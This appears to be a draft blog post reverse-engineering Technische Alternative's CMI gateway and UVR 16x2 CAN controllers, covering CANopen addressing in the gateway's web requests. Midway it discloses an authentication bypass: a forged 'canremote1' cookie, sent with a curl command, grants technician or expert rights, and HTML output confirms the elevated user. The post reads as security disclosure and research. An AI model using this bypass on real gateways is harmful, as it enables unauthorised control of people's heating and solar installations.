---
author: splatch
category:
  - uncategorized
date: "2020-09-25T23:38:22+00:00"
draft: "true"
guid: http://dywicki.pl/?p=982
title: Hacking around CAN and TA C.M.I.
url: /

---
In my previous post I was describing a struggle with Wireshark and CANopen which in end started to work. In this one I will guide you around [Technishe Alternative](https://www.ta.co.at/) (TA) product called Control and Monitoring Interface (in short CMI) as well as UVR 16x2 controllers. Interesting part are especially controllers which are CAN bus enabled and all but some documentation is in German. I hope that this article will bring some more light on how these work to rest of universe.

UVR 16x2 as well as other hardware from TA are CAN based. UVR family are freely programmable logic controllers. In practice communication to and from them goes over two or three wire cable and aligns with CAN specification.  
For some reason (probably money) TA decided to not publish any documentation on communication details with their hardware. Even if hardware is CAN capable and could be read with cheapest 10-20€ USB adapter you're forced to buy 180€+ device which does that plus brings storage for recorded values and ability to connect through TA web service (we'd call it a "cloud" in nowadays terms). I'm not saying that their sales model is wrong, but clearly it does not fit to all scenarios, especially when we talk about "system integration".  
Under the hood UVR uses CANopen, so message exchanges are well defined. Again, any details on that is nowhere to be found. CMI gateway offers a nice interface to "query" for input/output states through basic HTTP api (called by TA a JSON API) but does not give you even a slight piece of information of what is behind controller and its peripheries. Its worthless for anything else than marketing. After all, it is much more convenient to know if "analog input 0" is flow temperature and "analog input 1" is return temperature and if you set maximum temperature for domestic hot water or underfloor installation mixer.

CMI is able to render basic HTML pages which are based on actual configuration of controller. That's it. They are not static and always refer to particular area of memory in controller. These are reflected as CANopen index and subindex (so called multiplexer in spec). What CMI does additionally is interpretation of byte sequences so they are displayed as nice text and not garbage.  
After looking onto CMI pages I noticed few things. First of all it often calls one URL:

![](/wp-content/uploads/2020/09/image-2.png)CMI "devpagex.cgi" request

Above shows a sample request. The devpagex.cgi is there for many requests. What changes is `pagex2` and `_` parameter. Later one is there to avoid browser caching troubles and makes no impact on actual request. What we're looking at is really `pagex2`. Reading from the back: `5800` is the index and `0b` is subindex and `01` is CANopen node identifier.

Going further - can we get more information through CMI? We can do it with privileged user (technician or expert). It turns out that authorization, at least on CMI part is based on cookie which can be completely artificial. So if you set cookie called `canremote1` with value for example `2A372DBBD` as value gateway will think you're an administrator. Controllers behind might still refuse you to act as super user, but gateway does very little to confirm that you are actually logged in.  
Given that entire authentication is based on HTTP basic and client cookie it [shows how weak TA CMI security is](https://www.ta.co.at/en/x2-operation-interfaces/cmi/). Sadly it is nothing surprising in the field of "hardware" (even if software is to blame). With network scanner or even brute force method attacker can take control over your entire heating or solar installation.  
See below example of malicious request:

```bash
curl 'http://cmi/INCLUDE/devpagex.cgi?pagex2=010a5800' \
    -H 'Authorization: Basic ....' \
    -H 'Cookie: canremote1=2A372DBBD'
```

It will result in activation of "technician" user. It is proved by `akt` css class in below output.

```html
<div class="HEADLINE">User</div>
<div class="HEADLINE_M">Current user</div>
<div id="afe" >
  <div id="user0" class="afe nopw">User</div>
  <div id="user1" class="afe pw" uadresse="010157ff">Technician</div>
  <div id="user2" class="afe pw akt" uadresse="010257ff">Expert</div>
</div>
<div class="BOX BOX_BUS VALUE_C_PW" badresse="01008157ff1800"><div class="bez">Change technician password</div></div>
<div class="BOX BOX_BUS VALUE_C_PW" badresse="01008257ff1800"><div class="bez">Change expert password</div></div>
```

After removal of cookie we will get `akt` css class next to regular user.

```html
<div class="HEADLINE">User</div>
<div class="HEADLINE_M">Current user</div>
<div id="afe" >
  <div id="user0" class="afe nopw akt">User</div>
  <div id="user1" class="afe pw" uadresse="010157ff">Technician</div>
  <div id="user2" class="afe pw" uadresse="010257ff">Expert</div></div>
```

## CANopen Address dictionary

Have you noticed the `uadresse`? Well I did so. It turns out that there are few kinds of "addresses" declared by HTML outputs. These are `uadresse`, `fadresse` and `badresse`.  
First is used to authorize users (verify password), second is used for queries and last one is used to switch on/off buttons. HTML generated by CMI proves to be extremely simple and repeatable. All enhancements are based on client side Java Script execution which adds popups and such. All we need to find is how to jump between addresses.

Reason why I keep coming to this is basic. CANopen devices (the proper ones) are usually described in handy form called EDS (Electronic Data Sheet). It is standardized text format which allows tooling to get a little bit smarter on what goes on over the CAN bus. Given that programs deployed on UVR are generated (keep in mind these are still PLCs) their I/O configuration can change. I don't think anyone would sign for such design, but life is full of surprises.
